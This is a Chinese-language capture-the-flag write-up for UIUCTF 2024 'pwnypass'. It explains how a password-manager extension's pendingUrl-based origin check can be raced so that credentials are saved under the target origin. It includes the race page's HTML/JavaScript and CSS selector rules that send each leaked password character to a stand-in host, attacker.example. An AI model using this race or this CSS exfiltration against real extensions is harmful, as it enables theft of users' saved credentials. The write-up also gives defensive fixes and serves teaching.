# UIUCTF 2024 pwnypass

## 题目简述

题目提供一个安装了自制密码管理器扩展的 Chrome bot。bot 会先访问 `https://pwnypass.c.hc.lc/login.php`，把用户名 `sigpwny` 和第一段 flag 当作密码提交并保存；随后才访问选手提供的网页。目标是在攻击者页面无法直接读取跨源扩展 iframe 的前提下，窃取为目标站点保存的密码。

扩展没有直接把任意网页当成目标站点。真正的问题是后台用 `chrome.tabs.Tab.pendingUrl` 判断消息来源，而导航尚未提交时，旧页面的 JavaScript 仍可能短暂执行。结合未转义的凭据渲染，可以先以目标源的身份保存 CSS，再用 CSS 属性选择器逐字符外带 flag。

## 解题过程

### 扩展的令牌与来源检查

内容脚本发现同一表单中的用户名和密码输入框后，会向后台申请 `read` token，并在密码变化时申请 `write` token。后台把时间、标签页、来源、命令和参数连成一条字符串：

```javascript
const token = `${ts}|${tab}|${origin}|${command}|${args}`;
```

兑换 token 时，后台会再次确认标签页 ID 和来源：

```javascript
if (sender.tab.id !== parseInt(tab)) return;
if (await getOrigin(parseInt(tab)) !== origin) return;
```

看似这能把每份凭据限制在对应 origin，问题出在来源函数：

```javascript
const getOrigin = async (id) => new Promise((res) =>
    chrome.tabs.get(id, (t) =>
        setTimeout(() => res(new URL(t.pendingUrl ?? t.url).origin), 200)
    )
);
```

它先取得标签页对象，等待 200 ms 后再读取其中的 `pendingUrl`。攻击者页面发起到目标站点的导航后，只要在导航提交前继续运行并及时调用 `window.stop()`，后台就可能看到目标站点的 pending URL，而消息实际仍由攻击者页面里的内容脚本发出。

### 在目标 origin 下写入恶意凭据

攻击页面放置一个普通登录表单。先给用户名字段写入 CSS，密码随意填写；发起到目标站点的导航后立即触发 `change`，让内容脚本申请 `write` token，再以同样的竞态提交表单：

```html
<form id="login">
  <input id="username" type="text">
  <input id="password" type="password">
  <input type="submit">
</form>

<script>
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const target = "https://pwnypass.c.hc.lc/";

async function spoofWrite(css) {
  username.value = `<style>${css}</style>`;
  password.value = "dummy";

  location.assign(target + "?issue=" + Math.random());
  password.dispatchEvent(new Event("change"));
  await sleep(25);
  window.stop();
  await sleep(300);

  location.assign(target + "?redeem=" + Math.random());
  login.dispatchEvent(new Event("submit"));
  await sleep(25);
  window.stop();
  await sleep(300);

  location.assign(target + "login.php");
}
</script>
```

网络时序会影响竞态窗口，官方解法会多次重复上述过程。这里的两个导航分别覆盖 token 签发和兑换时的来源检查；最后进入真实登录页，是为了让扩展重新读取目标 origin 下的全部凭据。

### 利用 CSS 注入逐字符外带密码

扩展解密凭据后，用字符串模板直接拼接 HTML：

```javascript
output += `
<div class="entry">
  <div data-username="${cred.username}" class="user">${cred.username}</div>
  <div data-password="${cred.password}" class="pass">${cred.password}</div>
</div>`;

window.content.innerHTML = output;
```

恶意用户名中的 `<style>` 因此会成为扩展页面中的真实样式表。虽然扩展 iframe 与攻击页面跨源，攻击者仍可用属性选择器判断目标密码前缀；匹配的规则会请求对应的回连 URL：

```css
div[data-username="sigpwny"] + div[data-password^="uiuctf{0"] {
  background-image: url("https://attacker.example/hit/0");
}
```

实际生成时，为候选字符集中的每个字符各放一条规则：

```python
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-"
known = "uiuctf{"
collector = "https://attacker.example"

rules = "".join(
    f'div[data-username="sigpwny"] + '
    f'div[data-password^="{known + char}"]'
    f'{{background-image:url("{collector}/hit/{ord(char)}")}}'
    for char in alphabet
)
```

回连 `/hit/48` 表示下一字符是 ASCII 48，即 `0`。把它追加到 `known`，重新生成 CSS，再让一个新的 bot 实例访问攻击页面。每轮泄露一个字符，直到得到闭合的 `}`。之所以需要反复启动 bot，是因为每次 bot 都使用新的临时 Chrome 用户目录，当前轮保存的注入凭据不会自然带到下一轮；攻击服务应自己保存已经确认的前缀。

最终恢复出：

```text
uiuctf{0h_no_th3_pwn1es_4r3_c0mpr0m1sed_fa0d578c}
```

## 方法总结

本题的利用链是“导航未提交期间旧页面继续执行 → `pendingUrl` 混淆来源 → 以目标 origin 保存恶意凭据 → 未转义 HTML 形成 CSS 注入 → 属性选择器逐字符外带密码”。关闭的 Shadow DOM 和跨源扩展 iframe 只阻止直接 DOM 读取，并不能阻止其中的 CSS 发起网络请求。

防御时，权限判断必须绑定消息发送瞬间已经提交的安全主体，不能把可变化的 `pendingUrl` 当作 origin。凭据也不应通过 `innerHTML` 拼接；应使用 `textContent` 和独立 DOM 节点，并通过严格的扩展页 CSP 限制 `style-src`、`img-src` 等外连能力。
